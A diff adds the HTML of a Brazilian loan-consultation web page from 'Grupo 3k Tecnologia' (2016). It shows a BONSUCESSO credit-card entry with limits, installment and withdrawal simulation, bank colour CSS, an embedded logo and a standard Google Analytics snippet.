+              <div class="right">
+                                <button class="btn btn-sm btn-primary" data-type="false" data-toggle="modal" data-target="#hisconsimulator">Simular</button>
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>0,02992</li>
+                <li><i></i>Refinanciamento</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='955'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='955'] .empinfo .detail .timeleft ul li {
+              color:#83826B !important;
+          }
+          #hiscon #emp[data-codbanco='955'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#83826B !important;
+          }
+          #hiscon #emp[data-codbanco='955'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #83826B #83826B #83826B !important;
+          }
+          #hiscon #emp[data-codbanco='955'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #83826B !important;
+          }
+          </style>
+          <div id="emp" data-type="76" data-key="d077fdd7130a5a7d2574ee13ed52b394" data-codbanco="955" data-saldo="0.00" data-pmt="48.66" data-prazo="5">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAA3NCSVQICAjb4U/gAAABtlBMVEW9vLC7u7D7rR73qyD3rCDzqiHxqSPtpyTrpifspiPppSXopSnjoyzgoivioijjoiXfoSrbojHenyjbninWnTDXnS3XnijTnTPXmyjTmiyUnqLKmTfPmC2cm4nGlTTElDPAlT/Fky26lELAlDnEkzG2kUKykUi9jzG5kDqUk3+xjkK0jTisjEemjU+tjEKNjn2viTepiUKjiEmfiFGmh0Gah1WghkephTaihkGZhVGbhE2kgzeigz2ggjydg0SRg1ifgDqMgVmDgmuLgV6Yf0GFfl2PfUuAf2p8fWmKfFGJe06LekmPeUGFelN8e2SAeluQeDx5emh6eWN+eVx+eFh2eGd7eF6BdUxydWV6dFVzdWR2dF6Ac0pxdGF+cUh4cE1tcmNxcV15bkZwb1hubld7bUJobmJebXNlbGFqa1Vva05obFxwaUVpaVVkal1haV9oaFBhaF1kZlJeZ15gZllmZElcZV1hY1BbZF1cY1ZfYlBaY1pXYlxRYWddYE5TYWhVYFlZX1JaXkxRXVlRW1VNWlhMWFRKWFdJVVVIVVJFVFVBUlRDUlI8TlI7TVE5SVE2SVD///9BlmpTAAAAknRSTlP/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ACbJoVIAAAAJcEhZcwAACsMAAArDATQpJKsAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAACHUlEQVRIiZWWaVfTQBSGLzcUsJTWDQtFkCKCqCwuqCgqCu6A1B1xqUJplaUeEUQBqdaiWJfmHztJM8nMnRzbPF9yl/c5mST9UND1yEahTDYiug56sty4QVKHiJd8oRCBzb+e2IQ/HoHfHlGECddYImELeULDPJ3k81+jDb94rQqhbTLZHtK0ZbtTBTwvDxIhxDNOCz8J+xCXhfZzFBFDW85AEfYgNv7gzdaQxvL4StjDdwITcMSqn4eMOHaKe1fB98moPkTNOFZ/kYQcwRAwmst9u6AV8zgq7d2Fvqx1GsZ+eQ9ZgvHQb9618zhqb+W9KuwYzQxqdh4HsyWEkY9Pg04cd2eokCEstKPIC7qHdRnxNIyj6xRZeBSU4uh/rwprDq8PIOH2mgKs2pz10XzLqgqscFpoHKtmVlRgyeYUvcPFmSUVSDtMyzepXwxeSyuA1N0S3pI22YP+uRJCOnXc/g49k6w8rAopwk4rH5ytNy5jdA+zBC7cPG1e6uheEeqK+YNTVdbJyhOqXzbxZ79PhDihKJybquUPv1feuwvhePzZEf6+TpQWfPeM6k7Y+oU8lITHhACLHLPqAb9pNIl7N2HXE7s7ZJ5rQBQeEJhwWWivGuequesMXIQ2eXCyBrH1f0LtOJmMt1VWXnKEGCHQTyex2HA4YNdwg9BBBybd3bxShFJAr7d8L1Rc90QF6M1XPNDM/s3o0FVuvIul/wFzVDabkc/AFgAAAABJRU5ErkJggg==" width="48" height="48" />
+                <label>955</label>
+              </div>
+              
+              <div class="left detail">
+                                <h4>BONSUCESSO</h4>
+                <span class="numeric"><i></i>852333009-3</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">-</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">-</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">778.00</span><label>Limite Cartão</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">48.66</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Cliente realizou saque no cartão de crédito. Favor verificar disponibilidade de saque no sistema do banco.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">1176</span>
+                  <label>Limite Saque</label>
+                </div>
+              </div>
+              <div class="right">
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>25X</li>
+                <li><i></i>Saque Complementar</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                  </div>
+      </div>
+
+          </div>
+        </div>
+        <div class="alert alert-info" role="alert">
+          <center>Grupo 3k Tecnologia | Versão 5.1 - Release 11 - 2016 | Atualização 31/10/2016 | Protocolo: 4019.1623.1361.0196.1791</center>
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+</body>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-86538579-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
